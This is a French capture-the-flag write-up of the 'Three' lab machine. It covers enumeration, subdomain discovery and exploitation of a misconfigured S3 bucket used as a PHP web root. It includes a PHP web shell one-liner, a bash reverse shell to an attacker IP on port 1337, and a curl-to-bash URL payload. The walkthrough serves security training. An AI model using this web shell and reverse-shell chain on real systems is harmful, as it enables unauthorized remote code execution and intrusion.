# Note détaillée du déroulement du document "Three Write-up"

## Introduction

Les organisations de tous types, tailles et industries utilisent le cloud pour une grande variété de cas d'utilisation, tels que la sauvegarde des données, le stockage, la reprise après sinistre, les emails, les bureaux virtuels, le développement et les tests de logiciels, etc. Il est donc crucial de disposer d'une configuration sécurisée pour l'infrastructure cloud d'une entreprise afin de se protéger contre toute attaque. "Three" est une machine Linux qui comprend un site web utilisant un bucket AWS S3 comme dispositif de stockage cloud. Nous pouvons exploiter ce bucket S3 mal configuré et y télécharger un shell inversé. Nous pouvons ensuite visiter l'URL correspondante pour exécuter le fichier inverse et finalement récupérer le flag.

Note : Veuillez laisser à la machine quelques minutes pour démarrer correctement après l'avoir lancée, car localstack a besoin de quelques minutes pour se charger.

## Énumération

Pour commencer, nous vérifierons les ports ouverts en utilisant un scan Nmap :

- **Commande** : `sudo nmap -sV -p- 10.129.227.248`

Le scan montre que deux ports sont ouverts : le port 80 (HTTP) et le port 22 (SSH). Explorons le port 80 en utilisant notre navigateur web.

Nous pouvons voir une page web statique qui propose une section de réservation de billets de concert, mais elle n'est pas fonctionnelle. Essayons de découvrir la technologie utilisée par le site web en utilisant une extension de navigateur appelée Wappalyzer. Elle peut être installée sur les navigateurs pris en charge à partir de [ce lien](https://www.wappalyzer.com/).

Une fois l'extension Wappalyzer installée, nous pouvons visiter le site web et cliquer sur l'icône de l'extension pour révéler les résultats.

Wappalyzer identifie PHP comme le langage de programmation utilisé par le site web.

En faisant défiler la page web, nous arrivons à la section "Contact", qui contient des informations sur l'e-mail. L'adresse e-mail mentionnée ici utilise le domaine thetoppers.htb.

Ajoutons une entrée pour thetoppers.htb dans le fichier /etc/hosts avec l'adresse IP correspondante pour pouvoir accéder à ce domaine dans notre navigateur.

Le fichier /etc/hosts est utilisé pour résoudre un nom d'hôte en une adresse IP. Par défaut, le fichier /etc/hosts est interrogé avant le serveur DNS pour la résolution des noms d'hôte, donc nous devons ajouter une entrée dans le fichier /etc/hosts pour ce domaine afin de permettre au navigateur de résoudre l'adresse de thetoppers.htb.

### 1. Modifier le fichier /etc/hosts

- **Commande** : `echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts`

## Énumération des sous-domaines

### Qu'est-ce qu'un sous-domaine ?

Un nom de sous-domaine est un élément d'information supplémentaire ajouté au début du nom de domaine d'un site web. Il permet aux sites web de séparer et d'organiser le contenu pour une fonction spécifique, telle qu'un blog ou une boutique en ligne, distincte du reste de votre site web.

Par exemple, si nous visitons hackthebox.com, nous pouvons accéder au site principal. Ou, nous pouvons visiter ctf.hackthebox.com pour accéder à la section du site utilisée pour les CTF. Dans ce cas, ctf est le sous-domaine, hackthebox est le domaine principal et com est le domaine de premier niveau (TLD).

Souvent, différents sous-domaines auront différentes adresses IP, donc lorsque notre système recherche le sous-domaine, il obtient l'adresse du serveur qui gère cette application. Il est également possible d'avoir un seul serveur gérant plusieurs sous-domaines. Cela est réalisé via le "routage basé sur l'hôte" ou le "routage de l'hôte virtuel", où le serveur utilise l'en-tête Host dans la requête HTTP pour déterminer quelle application est censée gérer la requête.

### 2. Énumération des sous-domaines

Comme nous avons le domaine thetoppers.htb, énumérons les autres sous-domaines qui peuvent être présents sur le même serveur. Il existe différents outils d'énumération disponibles pour cela, comme gobuster, wfuzz, feroxbuster, etc. Pour cet exemple, nous utiliserons gobuster pour l'énumération des sous-domaines avec la commande suivante.

Nous utiliserons les indicateurs suivants pour gobuster :

- **Commande** : `gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb`

- **vhost** : Utilise VHOST pour le brute-forcing.
- **-w** : Chemin vers la wordlist.
- **-u** : Spécifie l'URL.

Le résultat de gobuster montre qu'il existe un sous-domaine appelé s3.thetoppers.htb. Ajoutons également une entrée pour ce sous-domaine dans le fichier /etc/hosts.

### 3. Modifier le fichier /etc/hosts pour le sous-domaine

- **Commande** : `echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts`

Après avoir ajouté une entrée pour le domaine dans notre fichier hosts, visitons s3.thetoppers.htb en utilisant un navigateur.

La page web ne contient que le JSON suivant :

`{"status": "running"}`

# Qu'est-ce qu'un bucket S3 ?

Une recherche rapide sur Google contenant les mots-clés "s3 subdomain status running" nous renvoie ce résultat indiquant que S3 est un service de stockage d'objets basé sur le cloud. Il nous permet de stocker des éléments dans des conteneurs appelés buckets. Les buckets AWS S3 ont diverses utilisations, y compris la sauvegarde et le stockage, l'hébergement de médias, la livraison de logiciels, les sites web statiques, etc. Les fichiers stockés dans le bucket Amazon S3 sont appelés objets S3.

Nous pouvons interagir avec ce bucket S3 à l'aide de l'utilitaire awscli. Il peut être installé sur Linux en utilisant la commande `apt install awscli`.

### 4. Configurer awscli

- **Commande** : `aws configure`

Nous utiliserons une valeur arbitraire pour tous les champs, car parfois le serveur est configuré pour ne pas vérifier l'authentification (il doit néanmoins être configuré pour quelque chose pour que aws fonctionne).

Nous pouvons lister tous les buckets S3 hébergés par le serveur en utilisant la commande `ls`.

- **Commande** : `aws --endpoint=http://s3.thetoppers.htb s3 ls`
- **Commande** : `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`

Nous voyons les fichiers index.php, .htaccess et un répertoire appelé images dans le bucket spécifié. Il semble que ce soit la racine web du site fonctionnant sur le port 80. Donc, le serveur Apache utilise ce bucket S3 comme stockage.

awscli a une autre fonctionnalité qui nous permet de copier des fichiers dans un bucket distant. Nous savons déjà que le site utilise PHP. Ainsi, nous pouvons essayer de télécharger un fichier shell PHP dans le bucket S3 et, comme il est téléchargé dans le répertoire racine web, nous pouvons visiter cette page web dans le navigateur, ce qui exécutera ce fichier et nous permettra d'obtenir une exécution de code à distance.

Nous pouvons utiliser le one-liner PHP suivant qui utilise la fonction `system()` qui prend le paramètre d'URL `cmd` en entrée et l'exécute comme une commande système.

### 5. Créer un fichier PHP pour le télécharger

- **Commande** : ``echo '<?php system(\$_GET["cmd"]); ?>' > shell.php``

### 6. Télécharger le shell PHP

- **Commande** : `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`

Nous pouvons confirmer que notre shell est téléchargé en naviguant vers `http://thetoppers.htb/shell.php`. Essayons d'exécuter la commande système `id` en utilisant le paramètre d'URL `cmd`.

- **URL** : `http://thetoppers.htb/shell.php?cmd=id`

La réponse du serveur contient la sortie de la commande système `id`, ce qui vérifie que nous avons une exécution de code sur la machine. Essayons maintenant d'obtenir un shell inversé.

Pour un shell inversé, nous allons déclencher la machine distante pour qu'elle se connecte à l'adresse IP de notre machine locale sur le port d'écoute spécifié. Nous pouvons obtenir l'adresse IP `tun0` de notre machine locale en utilisant la commande suivante.

- **Commande** : `ifconfig`

Créons un nouveau fichier `shell.sh` contenant le payload de shell inversé bash suivant qui se connectera à notre machine locale sur le port 1337.

### Contenu de shell.sh :


`bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1`

### 7. Démarrer un écouteur ncat sur le port 1337

- **Commande** : `nc -nvlp 1337`

Démarrons un serveur web sur notre machine locale sur le port 8000 et hébergeons ce fichier bash. Il est crucial de noter ici que cette commande pour héberger le serveur web doit être exécutée depuis le répertoire contenant le fichier shell inversé. Donc, nous devons d'abord naviguer vers le répertoire approprié puis exécuter la commande suivante.

- **Commande** : `python3 -m http.server 8000`

Nous pouvons utiliser l'utilitaire curl pour récupérer le fichier shell inversé bash depuis notre hôte local puis le transmettre à bash pour l'exécuter. Visitons donc l'URL suivante contenant le payload dans le navigateur.

- **URL** : `http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash`

Nous recevons un shell inversé sur le port d'écoute correspondant.

Le flag peut être trouvé à `/var/www/flag.txt`.

- **Commande** : `cat /var/www/flag.txt`